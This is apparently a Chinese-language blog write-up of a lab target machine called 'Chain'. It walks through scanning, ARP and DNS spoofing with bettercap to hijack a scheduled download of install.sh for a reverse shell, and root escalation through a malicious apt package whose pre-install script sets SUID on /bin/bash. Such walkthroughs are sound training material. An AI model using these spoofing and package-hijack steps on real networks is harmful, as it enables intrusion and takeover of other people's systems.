@@ -1,0 +1,207 @@
+---
+title: 内部-chain
+date: 2025-10-13
+categories: [靶机]
+tags: [内部,arp欺骗,dns欺骗,medium]     # TAG names should always be lowercasey一主机发现
+---
+
+
+
+### 1.主机发现
+
+```
+└─# arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:84:cf:10, IPv4: 192.168.56.88
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)
+192.168.56.100  08:00:27:02:26:26       PCS Systemtechnik GmbH
+192.168.56.103  08:00:27:b5:f7:90       PCS Systemtechnik GmbH
+192.168.56.104  08:00:27:21:1e:e8       PCS Systemtechnik GmbH
+```
+
+靶机ip为192.168.56.104
+
+### 2.端口扫描
+
+```
+└─# nmap -Pn $ip -p-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-16 18:27 CST
+Nmap scan report for 192.168.56.104
+Host is up (0.00087s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:21:1E:E8 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
+```
+
+有22和80，去web瞅一眼
+
+### 3. web
+
+![屏幕截图 2025-10-16 184813](D:\blog\liangjoker.github.io\assets\img\屏幕截图 2025-10-16 184813.png)
+
++ d2VsY29tZTpqdW1v 解密后是`welcome:jumo`，但是没啥用
++ 其实是网站在做一个定时任务，从`https://raw.githubusercontent.com/ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh` 地址获取文件并执行，考察arp欺骗与dns欺骗，通过构造恶意文件来进行渗透
+
+
+
+### 4. arp欺骗，dns欺骗
+
++ **arp欺骗的原理是冒充网关来劫持流量，通过发送大量的arp包来迷惑靶机，让他认为网关的mac地址是我的，但是我一开始做的时候一直不成功，通过tcpdump查看流量发现他一直在发**
+
+  ```
+  └─# tcpdump -i eth0 arp
+  tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+  listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+  20:13:05.063326 ARP, Reply 192.168.56.88 is-at 00:0c:29:84:cf:10 (oui Unknown), length 46
+  20:13:06.064458 ARP, Reply 192.168.56.88 is-at 00:0c:29:84:cf:10 (oui Unknown), length 46
+  20:13:07.065116 ARP, Reply 192.168.56.88 is-at 00:0c:29:84:cf:10 (oui Unknown), length 46
+  20:13:08.065680 ARP, Reply 192.168.56.88 is-at 00:0c:29:84:cf:10 (oui Unknown), length 46
+  20:13:09.066270 ARP, Reply 192.168.56.88 is-at 00:0c:29:84:cf:10 (oui Unknown), length 46
+  20:13:10.067332 ARP, Reply 192.168.56.88 is-at 00:0c:29:84:cf:10 (oui Unknown), length 46
+  20:13:11.068279 ARP, Reply 192.168.56.88 is-at 00:0c:29:84:cf:10 (oui Unknown), length 46
+  ```
+
+  **可以看到，我的机器一直在发我自己的ip地址与mac地址，这明显与欺骗原理不同，正常应该是发送网关的地址与我的mac地址才对。我就卡了很久，甚至认为是工具有问题，哎，结果是因为我用的是virtualbox的Host-Only，我的kali是在vmware里面的，通过桥接到virtualbox的那张hostonly网卡来实现通信的，没有默认网关。然后只能在virtualbox里面把我的kali导进去**
+  
++ 那么再来试试看
+
+ ```
+  └─# bettercap
+  bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]
+  
+  192.168.3.0/24 > 192.168.3.94  » [00:00:23] [sys.log] [inf] gateway monitor started ...
+  192.168.3.0/24 > 192.168.3.94  » get gatewayu
+  192.168.3.0/24 > 192.168.3.94  » [00:00:27] [sys.log] [err] gatewayu not found
+  192.168.3.0/24 > 192.168.3.94  » get gateway
+  192.168.3.0/24 > 192.168.3.94  » [00:00:32] [sys.log] [err] gateway not found
+  192.168.3.0/24 > 192.168.3.94  » set arp.spoof.targets 192.168.3.6
+  192.168.3.0/24 > 192.168.3.94  » arp.spoof on
+  [00:00:55] [sys.log] [inf] arp.spoof enabling forwarding
+  [00:00:55] [sys.log] [inf] arp.spoof starting net.recon as a requirement for arp.spoof
+  192.168.3.0/24 > 192.168.3.94  » [00:00:55] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
+  192.168.3.0/24 > 192.168.3.94  » [00:00:55] [endpoint.new] endpoint 192.168.3.6 detected as 08:00:27:21:1e:e8 (PCS Systemtechnik GmbH).
+  192.168.3.0/24 > 192.168.3.94  » set dns.spoof.domains raw.githubusercontent.com
+  192.168.3.0/24 > 192.168.3.94  » set dns.spoof.address 192.168.3.94
+  192.168.3.0/24 > 192.168.3.94  » dns.spoof on
+  192.168.3.0/24 > 192.168.3.94  » [00:02:10] [sys.log] [inf] dns.spoof raw.githubusercontent.com -> 192.168.3.94
+  192.168.3.0/24 > 192.168.3.94  » [00:02:59] [sys.log] [inf] dns.spoof sending spoofed DNS reply for raw.githubusercontent.com (->192.168.3.94) to 192.168.3.6 : emtechnik GmbH).
+  192.168.3.0/24 > 192.168.3.94  » [00:02:59] [sys.log] [inf] dns.spoof sending spoofed DNS reply for raw.githubusercontent.com (->192.168.3.94) to 192.168.3.6 : emtechnik GmbH).
+  192.168.3.0/24 > 192.168.3.94  » [00:03:00] [sys.log] [inf] dns.spoof sending spoofed DNS reply for raw.githubusercontent.com (->192.168.3.94) to 192.168.3.6 : emtechnik GmbH).
+ 
+ ```
+
++ 查看arp流量
+
+  ```
+  ┌──(root㉿PH)-[/home/ph/Desktop]
+  └─# tcpdump -i eth0 arp       
+  tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+  listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+  00:01:23.472703 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:24.483778 ARP, Request who-has 192.168.3.1 tell 192.168.3.94, length 28
+  00:01:24.484330 ARP, Reply 192.168.3.1 is-at 52:54:00:12:35:00 (oui Unknown), length 46
+  00:01:24.488035 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:25.582812 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:26.588636 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:27.613351 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:28.645134 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:29.646787 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:30.660257 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  00:01:31.684176 ARP, Reply 192.168.3.1 is-at 08:00:27:71:cc:ae (oui Unknown), length 46
+  
+  ```
+
+  可以明显的看到现在就是正确的了，通过发送大量的arp包，将网关的ip与我的kali的mac对应达到欺骗目标arp表的效果，让他认为我就是网关
+
++ 在本地创建恶意文件并开启https服务
+
+  ```
+  └─# python3 /root/https_tmp.py 
+  
+  HTTPS 服务器已启动:
+  
+  - 地址: https://0.0.0.0:443
+  - 共享目录: /root/son
+  - 证书: /root/son/cert.pem
+    按 Ctrl+C 停止服务器
+  
+  192.168.3.6 - - [15/Oct/2025 00:06:01] "GET /ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh HTTP/1.1" 200 -
+  ```
+
+  在本地监听 shell就弹回来了
+
+### 5. 提权
+
+ ```
+  fish@Chain:/opt$ sudo -l
+  Matching Defaults entries for fish on Chain:
+      env_reset, mail_badpass,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+  
+  User fish may run the following commands on Chain:
+      (ALL) NOPASSWD: /usr/bin/apt update
+      (ALL) NOPASSWD: /usr/bin/apt install dsz
+      (ALL) NOPASSWD: /usr/bin/apt remove dsz
+ ```
+
++ 能够执行apt，思路是在我kali创建恶意的包并开启http服务来给靶机访问，进一步查看靶机的`/etc/apt/sources.list` 发现是可以写入的
+
++ **FPM** 的全称是 **Effing Package Management**，它的核心目标是：**“轻松地为不同操作系统构建软件包”**。他是用ruby写的，先安装 Ruby 和相关的开发包`sudo apt install ruby ruby-dev build-essential`，接着`gem install fpm` 
+
++ 我们在kali里面创建提权脚本(dsz_1.0_all.deb)
+
+  ```
+  ┌──(root㉿PH)-[~]
+  └─# TF=$(mktemp -d)
+  
+  ┌──(root㉿PH)-[~]
+  └─# echo 'chmod +s /bin/bash' > $TF/a.sh
+  
+  ┌──(root㉿PH)-[~]
+  └─# fpm -n dsz -s dir -t deb -a all --before-install $TF/a.sh $TF
+  Created package {:path=>"dsz_1.0_all.deb"}
+  
+  ┌──(root㉿PH)-[~]
+  └─# dpkg-scanpackages -m . > Packages
+  dpkg-scanpackages: info: Wrote 1 entries to output Packages file.
+  ```
+
++ 开启服务
+
+  ```
+  ┌──(root㉿PH)-[~]
+  └─# python -m http.server
+  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+  
+  ```
+
++ 修改靶机apt源
+
+  `echo "deb [trusted=yes] http://192.168.3.94/ ./" > /etc/apt/sources.list`
+  
++ 在靶机执行
+
+  ```
+  fish@Chain:~$ sudo /usr/bin/apt update
+  fish@Chain:~$ sudo /usr/bin/apt install dsz
+  ```
+
++ 接着`bash -p`就可以了
+
+
+
+### 6. flag展示
+
+```
+user.txt  flag{user-f307bc02d0f7e60e52d128a0c27b8e34}
+root.txt  flag{root-295744a86a16286a5657ebe336ba39a5}
+```
+
+
+
+
+
